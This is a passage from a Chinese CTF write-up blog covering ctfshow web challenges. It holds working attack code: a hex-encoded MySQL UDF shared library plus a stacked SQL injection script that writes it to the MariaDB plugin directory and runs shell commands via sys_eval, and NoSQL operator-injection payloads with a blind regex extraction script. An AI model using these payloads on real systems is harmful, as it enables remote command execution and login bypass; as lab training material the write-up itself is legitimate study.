5F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&#39;
codes&#x3D;[]
for i in range(0,len(code),128):
    codes.append(code[i:min(i+128,len(code))])
 
#建临时表
sql&#x3D;&#39;&#39;&#39;create table temp(data longblob)&#39;&#39;&#39;
payload&#x3D;&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)
requests.get(url+payload)
 
#清空临时表
sql&#x3D;&#39;&#39;&#39;delete from temp&#39;&#39;&#39;
payload&#x3D;&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)
requests.get(url+payload)
 
#插入第一段数据
sql&#x3D;&#39;&#39;&#39;insert into temp(data) values (0x&#123;&#125;)&#39;&#39;&#39;.format(codes[0])
payload&#x3D;&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)
requests.get(url+payload)
 
#更新连接剩余数据
for k in range(1,len(codes)):
    sql&#x3D;&#39;&#39;&#39;update temp set data &#x3D; concat(data,0x&#123;&#125;)&#39;&#39;&#39;.format(codes[k])
    payload&#x3D;&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)
    requests.get(url+payload)
 
#10.3.18-MariaDB    
#写入so文件
sql&#x3D;&#39;&#39;&#39;select data from temp into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;udf.so\&#39;&#39;&#39;&#39;
payload&#x3D;&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)
requests.get(url+payload)
 
#引入自定义函数
sql&#x3D;&#39;&#39;&#39;create function sys_eval returns string soname &#39;udf.so\&#39;&#39;&#39;&#39;
payload&#x3D;&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)
requests.get(url+payload)
 
#命令执行，结果更新到界面
sql&#x3D;&#39;&#39;&#39;update ctfshow_user set pass&#x3D;(select sys_eval(&#39;cat &#x2F;flag.her?&#39;))&#39;&#39;&#39;
payload&#x3D;&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)
requests.get(url+payload)
 
#查看结果
r&#x3D;requests.get(url[:-4]+&#39;?page&#x3D;1&amp;limit&#x3D;10&#39;)
print(r.text)</code></pre>
<h1 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h1><blockquote>
<p><a target="_blank" rel="noopener" href="http://rui0.cn/archives/609">http://rui0.cn/archives/609</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/97211">https://www.anquanke.com/post/id/97211</a><br><a target="_blank" rel="noopener" href="https://gylq.gitee.io/2021/08/04/%E3%80%90MongoDB%E3%80%91%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/">https://gylq.gitee.io/2021/08/04/%E3%80%90MongoDB%E3%80%91%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/</a></p>
</blockquote>
<h2 id="nosql"><a href="#nosql" class="headerlink" title="nosql"></a>nosql</h2><pre class="language-sql" data-language="sql"><code class="language-sql">$user &#x3D; $memcache-&gt;get($id);</code></pre>
<p>payload：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">api&#x2F;?id[]&#x3D;flag</code></pre>
<h1 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h1><pre class="language-sql" data-language="sql"><code class="language-sql">  $query &#x3D; new MongoDB\Driver\Query($data);
  $cursor &#x3D; $manager-&gt;executeQuery(&#39;ctfshow.ctfshow_user&#39;, $query)-&gt;toArray();

&#x2F;&#x2F;无过滤
  if(count($cursor)&gt;0)&#123;
    $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;
    array_push($ret[&#39;data&#39;], $flag);
  &#125;
</code></pre>
<pre class="language-sql" data-language="sql"><code class="language-sql">username[$ne]&#x3D;1&amp;password[$ne]&#x3D;1</code></pre>
<p>有的时候服务器会摆，重启一下试试</p>
<h1 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h1><p>post传入：</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">username[$regex]&#x3D;.*&amp;password[$regex]&#x3D;.*</code></pre>
<h1 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h1><pre class="language-sql" data-language="sql"><code class="language-sql">username[$regex]&#x3D;f.*&amp;password[$ne]&#x3D;1</code></pre>
<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690559031690-d2869572-b4e7-4998-82b0-ac7e4a1077cc.png" alt="image.png"></p>
<h1 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h1><p>这里直接用别人的脚本了：<br>道理是相同的，一点点猜即可。</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"># -- coding:UTF-8 --
# Author:孤桜懶契
# Date:2021&#x2F;8&#x2F;4
# blog: gylq.gitee.io
import requests

url &#x3D; &quot;http:&#x2F;&#x2F;a2efa0f0-f634-4621-bd4a-e96a4f1b0196.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;
str &#x3D; &quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;
flag &#x3D; &quot;&quot;

payload_user &#x3D; &quot;flag.*&quot;
payload_pass &#x3D; &quot;^&#123;&#125;.*&quot;

n &#x3D; 0

for i in range(1, 666):
    for j in str:
        data &#x3D; &#123;
            &#39;username[$regex]&#39;:payload_user,
            &#39;password[$regex]&#39;:payload_pass.format(flag+j)
        &#125;
        res &#x3D; requests.post(url &#x3D; url, data&#x3D;data)
        if r&quot;\u767b\u9646\u6210\u529f&quot; in res.text:
            flag +&#x3D; j
            n +&#x3D; 1
            print(&#39;[*] 开始盲注第&#123;&#125;位&#39;.format(n))
            print(flag)
            if j &#x3D;&#x3D; &quot;&#125;&quot;:
                print(&#39;[*] flag is &#123;&#125;&#39;.format(flag))
                exit()
            break</code></pre>
<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690559359451-1e99e676-d5bf-441a-9aa3-ead32343ea3f.png" alt="image.png"></p>

                        </article>
                    </div>


                    <div class="fleet-content-body-footer mt-16">
                        <!--翻页器-->
                        <div class="flex-row flex w-full justify-between">
                            <div class="fleet-content-body-footer-left">
                                
                                    <div><a href="/posts/a574213f/"
                                            class="btn btn-sm md:btn-md gap-2 lg:gap-3">
                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
                                                 xmlns="http://www.w3.org/2000/svg"
                                                 width="24" height="24" viewBox="0 0 24 24">
                                                <path d="M15.41,16.58L10.83,12L15.41,7.41L14,6L8,12L14,18L15.41,16.58Z"></path>
                                            </svg>
                                            <div class="flex flex-col items-start"><span
                                                        class="text-base-content/50 hidden text-xs font-normal md:block">上一篇</span>
                                                <span>web254-web278反序列化篇</span></div>
                                        </a></div>
                                
                            </div>
                            <div class="fleet-content-body-footer-right">
                                
                                    <div><a href="/posts/d18ef46e/"
                                            class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
                                            <div class="flex flex-col items-end"><span
                                                        class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
                                                <span>使用Python脚本修改语雀导文件图片格式(二)</span></div>
                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
                                                 xmlns="http://www.w3.org/2000/svg"
                                                 width="24" height="24" viewBox="0 0 24 24">
                                                <path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z"></path>
                                            </svg>
                                        </a></div>

                                
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        </div>
    </div>
</div>

    <!--    嵌套位置结束-->





    <!--<h3>categories</h3>-->
    <!--<ul>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/categories/CTF/">-->
    <!--                CTF-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/categories/CTF/JavaSec/">-->
    <!--                JavaSec-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/categories/Python/">-->
    <!--                Python-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--</ul>-->

    <!--<h3>tags</h3>-->
    <!--<ul>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/WriteUp/">-->
    <!--                WriteUp-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/CISCN/">-->
    <!--                CISCN-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">-->
    <!--                Java反序列化-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/CC%E9%93%BE/">-->
    <!--                CC链-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/CTFshow0-1/">-->
    <!--                CTFshow0-1-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/%E8%84%9A%E6%9C%AC/">-->
    <!--                脚本-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/Tampermonkey/">-->
    <!--                Tampermonkey-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/Shortcut/">-->
    <!--                Shortcut-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--        <li>-->
    <!--            <a href="/tags/%E8%AF%AD%E9%9B%80/">-->
    <!--                语雀-->
    <!--            </a>-->
    <!--        </li>-->
    <!--    -->
    <!--</ul>-->
</div>
<!--返回顶部按钮-->
<button class="backToTopBtn btn" title="返回顶部">&#8593;</button>
<!--加个渐变，但还是有点丑-->
<!-- TODO 换个更好的方案-->
<div class="h-1 bg-gradient-to-t from-base-content to-base-100">
</div>

<footer class="footer p-10 bg-neutral text-neutral-content">
    <aside>
        <svg width="50" height="50" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" class="fill-current mt-3"><path d="M22.672 15.226l-2.432.811.841 2.515c.33 1.019-.209 2.127-1.23 2.456-1.15.325-2.148-.321-2.463-1.226l-.84-2.518-5.013 1.677.84 2.517c.391 1.203-.434 2.542-1.831 2.542-.88 0-1.601-.564-1.86-1.314l-.842-2.516-2.431.809c-1.135.328-2.145-.317-2.463-1.229-.329-1.018.211-2.127 1.231-2.456l2.432-.809-1.621-4.823-2.432.808c-1.355.384-2.558-.59-2.558-1.839 0-.817.509-1.582 1.327-1.846l2.433-.809-.842-2.515c-.33-1.02.211-2.129 1.232-2.458 1.02-.329 2.13.209 2.461 1.229l.842 2.515 5.011-1.677-.839-2.517c-.403-1.238.484-2.553 1.843-2.553.819 0 1.585.509 1.85 1.326l.841 2.517 2.431-.81c1.02-.33 2.131.211 2.461 1.229.332 1.018-.21 2.126-1.23 2.456l-2.433.809 1.622 4.823 2.433-.809c1.242-.401 2.557.484 2.557 1.838 0 .819-.51 1.583-1.328 1.847m-8.992-6.428l-5.01 1.675 1.619 4.828 5.011-1.674-1.62-4.829z"></path></svg>
        © 2020-2024 Lupas by Natro92
        <pre class="whitespace-pre-line">框架 <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/">Hexo</a> | 主题 <a target="_blank" rel="noopener" href="https://www.example.com">Lupas</a></pre>
    </aside>
    <nav>
        <header class="footer-title">Social</header>
        <!--<div class="grid grid-flow-col gap-4">-->
        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path></svg></a>-->
        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path></svg></a>-->
        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path></svg></a>-->
        <!--</div>-->
    </nav>
</footer>
</body>

</html>


